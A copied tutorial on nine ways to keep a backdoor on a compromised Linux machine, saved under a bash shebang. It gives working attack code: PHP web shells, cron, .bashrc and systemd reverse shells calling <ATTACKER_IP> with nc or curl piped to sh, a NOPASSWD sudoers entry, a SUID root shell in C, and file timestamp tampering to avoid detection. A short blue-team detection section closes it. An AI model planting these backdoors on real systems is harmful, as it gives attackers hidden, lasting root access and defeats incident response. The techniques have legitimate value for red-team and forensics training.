#!/bin/bash

## Source: https://medium.com/@airman604/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c

1. SSH keys

This is useful if you can access SSH service on the machine. SSH keys are a secure and convenient way to login through SSH. When you configure SSH keys for a Linux user account, you can login through SSH without knowing the account’s password.

SSH keys work as follows:

    If key-based authentication is enabled (which is the default) when a logon attempt is made SSH daemon will check user’s configured authorized keys in ~/.ssh/authorized_keys (there may be several, one per line).
    The file permissions should be set to only allow the user to edit it, otherwise it is ignored for security reasons.
    If the key authentication request is matched with any of the authorized public keys, SSH daemon accepts the login.

So, if we add our public key to some user’s authorized_keys file, we’ll be able to login as that user through SSH. If you don’t have a key already, you can generate one on your attacker machine using ssh-keygen.

Adding SSH key:

    Add your public key to the user’s ~/.ssh/authorized keys (create the directory and the file if it’s not there, if the file exists just add a line with your key).
    Ensure proper permissions:
    chmod 700 ~/.ssh
    chmod 600 ~/.ssh/authorized_keys

If you have root access, you can do this for all users that have a home directory and a valid shell — this also includes “service” users.

More info: https://wiki.archlinux.org/index.php/SSH_keys
2. PHP

This can be used for web servers that have PHP enabled. If there’s existing PHP pages, the backdoor snippet can be added to them. If not, a new PHP file can be created.

Simple command execution backdoor:

<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>

A couple useful tips — with the above code you can use either GET or POST requests to send commands. With GET requests all your commands will end up in the web server’s access logs, so POST is a bit sneakier. Even more sneakier option is to pass commands through an HTTP request header, you can use the following modified snippet for that:

<?php
    if (isset($_SERVER['HTTP_CMD'])) {
        echo "<pre>" . shell_exec($_SERVER['HTTP_CMD']) . "</pre>";
    }
?>

You can do a GET (or POST) request and pass commands in a Cmd HTTP header.

More info: look in /usr/share/webshells/php on your Kali machine.
3. Steal PHP Sessions

On a web server that hosts PHP applications, PHP may be configured to store session information in files on disk. If that is the case, you can enumerate and hijack existing sessions by listing the session files. Default location of the sessions directory is /var/lib/php/sessions, and the session file naming format is sess_<SESSION_ID>. Grab any session id and set your PHPSESSID cookie to it to hijack the session.

The path for the session files and the cookie name are configurable, so if something is not working check these settings in the php.ini:

    session.save_path
    session.name

4. Cron Jobs

Cron jobs can serve as a persistence mechanism when configured to periodically send a reverse shell back to your attacker machine. Here’s one example:

CT=$(crontab -l)
CT=$CT$'\n10 * * * * nc -e /bin/bash <ATTACKER_IP> <PORT>'
printf "$CT" | crontab -

This will run a reverse shell 10 minutes past every hour and assumes netcat-traditional is installed on the machine. Another option is to use curl:

CT=$(crontab -l)
CT=$CT$'\n10 * * * * curl http://<ATTACKER_IP>/run | sh'
printf "$CT" | crontab -

The cron job can alternatively be added to /etc/crontab if you have root access.

More info: https://www.adminschoice.com/crontab-quick-reference
5. Apache mod_rootme

On a web server, mod_rootme Apache module (https://github.com/sajith/mod-rootme) can be installed for a privileged backdoor. Although Apache is usually not running as root, mod_rootme enables root access by using a pre-fork hook to take advantage of the master Apache process when it still has root permissions.

Once compiled, copy mod_rootme.so to the Apache modules directory (often /usr/lib/apache2/modules) and add the following string to the Apache config file (usually /etc/apache2/apache2.conf or /etc/httpd/conf/httpd.conf):

LoadModule rootme_module /usr/lib/apache2/modules/mod_rootme.so

To use the backdoor, connect to Apache using NetCat and type get root.
6. Users’ .bashrc

If a user has bash as their login shell, .bashrc file in their home directory is executed when an interactive session is launched. One can add a reverse shell (or curl-based remote script execution as described in the Cron Jobs section) to the user’s .bashrc file. This implies you know which users on the machine regularly log in and can wait until that time to re-gain access.

echo 'nc -e /bin/bash <ATTACKER_IP> <PORT> 2>/dev/null &' >> ~/.bashrc

(as in Cron Jobs section, this implies netcat-traditional is installed on the machine, replace with a different reverse shell otherwise)

More info: https://www.lifewire.com/bashrc-file-4101947
7. Services

If you can wait until the machine is restarted, the backdoor can be added as a system service that is launched at startup. This requires root access to the machine.
(Older) System V Way

    Create a script with your backdoor (such as the above mentioned NetCat reverse shell) in /etc/init.d. Make sure the script starts backdoor commands in the background!
    Check current runlevel by running runlevel (usually 3).
    Add a symlink named S99backdoor pointing to your script to /etc/rc#.d directory, where # is the runlevel. “backdoor” can be replaced with a more innocuous string, the important part of the name is S99, which tells the OS to start (S) the script at the end of the boot process (99).

(Newer) systemd Way

Create the following service descriptor at /etc/systemd/system/backdoor.service:

[Unit]
Description=Very important backdoor.[Service]
Type=simple
ExecStart=/usr/bin/nc -e /bin/bash <ATTACKER_IP> <PORT> 2>/dev/null[Install]
WantedBy=multi-user.target

Enable the backdoor service to run on restart:

systemctl enable backdoor

rc.local

Similar result can also be achieved by adding backdoor commands to /etc/rc.local. Make sure to start these commands in background mode as the boot process waits for the execution of rc.local to finish!
User Service

This option is similar to adding commands to ~/.bashrc, but uses systemd “user” services. Create the following service descriptor file at ~/.config/systemd/user/backdoor.service:

[Unit]
Description=Very important backdoor.[Service]
Type=simple
ExecStart=/usr/bin/nc -e /bin/bash <ATTACKER_IP> <PORT> 2>/dev/null[Install]
WantedBy=default.target

Enable with:

systemctl --user enable backdoor

More info: https://www.tecmint.com/manage-services-using-systemd-and-systemctl-in-linux/
8. sudoers

If you have root access to the machine but want to be able to get privileged access again at a later time through an unprivileged acco]]unt, enable the unprivileged account to execute sudo by adding the following to the /etc/sudoers file:

<USER>        ALL=(ALL)        NOPASSWD: ALL

More info: https://help.ubuntu.com/community/Sudoers
9. SUID files

Similar to sudoers, SUID (set uid) files can be used to retain privileged access. When executing a SUID file, OS will assign the process an effective user id (EUID) of the owner of the file. For security reasons, Linux ignores SUID bit on interpreted files (such as shell scripts) and strips SUID bit if the file is modified.

The following requires a compiler on the machine (alternatively it can be compiled on a different machine and copied over):

echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > privshell.c
gcc -o privshell privshell.c
rm privshell.c
chown root:root privshell
chmod u+s privshell

Move privshell to a safe place and run it later as an unprivileged user to get root shell.

More info: https://www.linuxnix.com/suid-set-suid-linuxunix/
Making Detection More Difficult

To make detection of all of these backdoors more difficult one can adjust modification time of the created files (this is what ls command shows) to a past date:

touch -t YYYYMMDDhhmm <file>

Blue Team Advice

As a wrap-up I wanted to list some tips for blue teams on detecting the techniques outlined above. This is by no means an exhaustive guide on Linux forensics and incident response.

If an attacker got root access to a machine, assume the worst. Ideally, take a memory dump and a forensic image of the hard drive for analysis and rebuilt it from scratch.

When a machine is compromised, chances are the attacker(s) will dump password hashes of all the users on the system and will try to crack them. It is important to change all the passwords — not only on the affected system, but on all the other systems that might use the same passwords.

Find all authorized_keys files. Don’t skip non-user (i.e. service) accounts, especially if they have a valid shell.

find / -name authorized_keys 2>/dev/null

SSH keys are sometimes left on machine images posted online. When using somebody’s image, make sure to check if any default SSH keys are configured.

Check active processes and network connections:

ps -ef
netstat -antp | grep ESTABLISHED
netstat -antp | grep LISTEN

Time-based searches are useful for quick triage. Keep in mind that file modification times are user-controllable, to improve reliability also include ctime (creation/change time) in the criteria as ctime is much harder to tamper with (requires changing system clock or low level filesystem modifications). Here’s a recommended command to find files created or modified in the last 5 days:

find / -mtime -5 -o -ctime -5 2>/dev/null

Find all SUID files owned by root and check if there’s any unexpected entries on the list:

find / -perm -4000 -user root -type f 2>/dev/null

To also find all SGID (set group id) files:

find / -perm /6000 -type f 2>/dev/null

PHP sessions can be cleaned using rm /var/lib/php/sessions/sess_* (this doesn’t happen automatically when Apache service is restarted!).

Check configured cron jobs. Crontab files with cron job definitions can be found in various places on the system:

    /var/spool/cron/crontabs/ — per-user cron jobs
    /etc/crontab — system crontab file, this will have references to all the other system crontab files below
    /etc/cron.d/
    /etc/cron.hourly/
    /etc/cron.daily/
    /etc/cron.weekly/
    /etc/cron.monthly/

System and detailed logging (eg. auditd) is useful, but only if coupled with offloading the logs to a separate log management system. Otherwise the logs can be tampered with.

If malicious artifacts are found on a compromised host, sweep other machines in your environment for the same artifacts.
